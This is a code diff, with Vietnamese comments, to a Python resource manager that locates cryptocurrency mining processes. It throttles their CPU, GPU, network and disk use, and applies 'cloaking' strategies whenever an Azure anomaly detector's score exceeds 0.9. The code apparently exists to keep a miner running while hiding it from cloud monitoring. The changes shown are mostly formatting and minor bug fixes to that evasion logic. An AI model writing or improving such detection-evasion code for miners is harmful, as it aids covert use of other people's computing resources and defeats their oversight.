@@ -114,6 +114,10 @@ class SharedResourceManager:
         Điều chỉnh mức sử dụng GPU theo %.
         """
         try:
+            # [CHANGES] Bảo vệ tránh trường hợp list rỗng hoặc invalid
+            if not isinstance(gpu_usage_percent, list):
+                gpu_usage_percent = []
+
             new_gpu_usage_percent = [
                 min(
                     max(gpu + self.config["optimization_parameters"].get("gpu_power_adjustment_step", 10), 0),
@@ -257,7 +261,8 @@ class SharedResourceManager:
                 adjustments = strategy.apply(process)
                 if adjustments:
                     self.logger.info(
-                        f"Áp dụng điều chỉnh {strategy_name} cho tiến trình {process.name} (PID: {process.pid}): {adjustments}")
+                        f"Áp dụng điều chỉnh {strategy_name} cho tiến trình {process.name} (PID: {process.pid}): {adjustments}"
+                    )
 
                     pid = process.pid
                     if pid not in self.original_resource_limits:
@@ -454,6 +459,7 @@ class ResourceManager(BaseManager):
         self.resource_adjustment_thread.start()
 
     def join_threads(self):
+        # [CHANGES] Đảm bảo không gọi task_done() thêm khi thread dừng, tránh double-calls
         self.monitor_thread.join()
         self.optimization_thread.join()
         self.cloaking_thread.join()
@@ -504,18 +510,20 @@ class ResourceManager(BaseManager):
                 proc_name = proc.info['name'].lower()
                 if cpu_process_name in proc_name or gpu_process_name in proc_name:
                     priority = self.get_process_priority(proc.info['name'])
-                    network_interface = self.config.get(
-                        'network_interface', 'eth0')
+                    network_interface = self.config.get('network_interface', 'eth0')
                     mining_proc = MiningProcess(
-                        proc.info['pid'], proc.info['name'], priority, network_interface, self.logger)
+                        proc.info['pid'], proc.info['name'],
+                        priority, network_interface, self.logger
+                    )
                     self.mining_processes.append(mining_proc)
             self.logger.info(
-                f"Khám phá {len(self.mining_processes)} tiến trình khai thác.")
+                f"Khám phá {len(self.mining_processes)} tiến trình khai thác."
+            )
 
-    # [CHANGES] Bảo đảm priority luôn về int, tránh bị dict
     def get_process_priority(self, process_name: str) -> int:
         priority_map = self.config.get('process_priority_map', {})
         priority = priority_map.get(process_name.lower(), 1)
+        # [CHANGES] Kiểm tra tránh so sánh dict < dict
         if isinstance(priority, dict):
             self.logger.warning(
                 f"Priority cho tiến trình '{process_name}' là dict, chuyển thành 1.")
@@ -547,10 +555,9 @@ class ResourceManager(BaseManager):
                         process, cpu_max_temp, gpu_max_temp)
 
                 power_limits = self.config.get("power_limits", {})
-                per_device_power = power_limits.get(
-                    "per_device_power_watts", {})
-                
-                # [CHANGES] Đảm bảo cpu_max_power, gpu_max_power là int
+                per_device_power = power_limits.get("per_device_power_watts", {})
+
+                # [CHANGES] Đảm bảo cpu_max_power, gpu_max_power là int, tránh so sánh dict
                 cpu_max_power = per_device_power.get("cpu", 150)
                 gpu_max_power = per_device_power.get("gpu", 300)
 
@@ -562,8 +569,8 @@ class ResourceManager(BaseManager):
                     self.collect_azure_monitor_data()
                     metric_data = self.gather_metric_data_for_anomaly_detection()
                     anomalies_detected = self.azure_anomaly_detector_client.detect_anomalies(
-                        metric_data)
-
+                        metric_data
+                    )
                     if (isinstance(anomalies_detected, dict) and
                             anomalies_detected.get('score', 0) > 0.9):
                         for process in self.mining_processes:
@@ -632,7 +639,7 @@ class ResourceManager(BaseManager):
 
                 if (self.shared_resource_manager.is_gpu_initialized() and
                         process.name.lower() == self.config['processes'].get('GPU', '').lower()):
-                    # GPU usage: truyền list rỗng, sau đó handle
+                    # Truyền list rỗng, sau đó handle GPU usage
                     adjustment_task = {
                         'function': 'adjust_gpu_usage',
                         'args': (process, [])
@@ -787,6 +794,7 @@ class ResourceManager(BaseManager):
                     'strategies': ['cpu', 'gpu', 'network', 'disk_io', 'cache']
                 }
                 self.resource_adjustment_queue.put((1, adjustment_task))
+                # [CHANGES] task_done() chỉ gọi một lần cho mỗi get()
                 self.cloaking_request_queue.task_done()
             except Empty:
                 continue
@@ -797,9 +805,9 @@ class ResourceManager(BaseManager):
     def resource_adjustment_handler(self):
         while not self.stop_event.is_set():
             try:
-                priority, adjustment_task = self.resource_adjustment_queue.get(
-                    timeout=1)
+                priority, adjustment_task = self.resource_adjustment_queue.get(timeout=1)
                 self.execute_adjustment_task(adjustment_task)
+                # [CHANGES] Gọi task_done() đúng một lần
                 self.resource_adjustment_queue.task_done()
             except Empty:
                 continue
@@ -849,15 +857,14 @@ class ResourceManager(BaseManager):
                 self.shared_resource_manager.apply_cloak_strategy('gpu', process)
             if adjustments.get('throttle_cpu'):
                 load_percent = psutil.cpu_percent(interval=1)
-                self.shared_resource_manager.throttle_cpu_based_on_load(
-                    process, load_percent)
+                self.shared_resource_manager.throttle_cpu_based_on_load(process, load_percent)
             self.logger.info(
                 f"Áp dụng điều chỉnh từ MonitorThread cho tiến trình {process.name} (PID: {process.pid}).")
         except Exception as e:
             self.logger.error(
                 f"Lỗi khi áp dụng điều chỉnh từ MonitorThread cho tiến trình {process.name} (PID: {process.pid}): {e}")
 
-    # [CHANGES] Kiểm soát việc trích xuất GPU config, tránh gọi len() sai
+    # [CHANGES] Kiểm soát việc trích xuất GPU config, tránh gọi len() sai kiểu
     def apply_recommended_action(self, action: List[Any], process: MiningProcess):
         """
         action = [cpu_threads, ram_allocation_mb, (n giá trị GPU?), disk_io_limit, network_bw_limit, cache_limit...]
@@ -866,16 +873,17 @@ class ResourceManager(BaseManager):
             cpu_threads = int(action[0])
             ram_allocation_mb = int(action[1])
 
+            # GPU config có thể là list hoặc int
             gpu_config = self.config.get("resource_allocation", {}).get("gpu", {}).get("max_usage_percent", [])
 
             gpu_usage_percent = []
-            # Nếu gpu_config là list, ta mới gọi len().
             if isinstance(gpu_config, list):
+                # Ví dụ user config GPU = [80, 80, ...]
                 length_needed = len(gpu_config)
                 gpu_usage_percent = list(action[2 : 2 + length_needed])
                 next_index = 2 + length_needed
             elif isinstance(gpu_config, (int, float)):
-                # CHỈ 1 GPU -> action[2] là số GPU usage
+                # Nếu config là single int/float => chỉ lấy 1 slot GPU usage
                 gpu_usage_percent = [float(action[2])]
                 next_index = 3
             else:
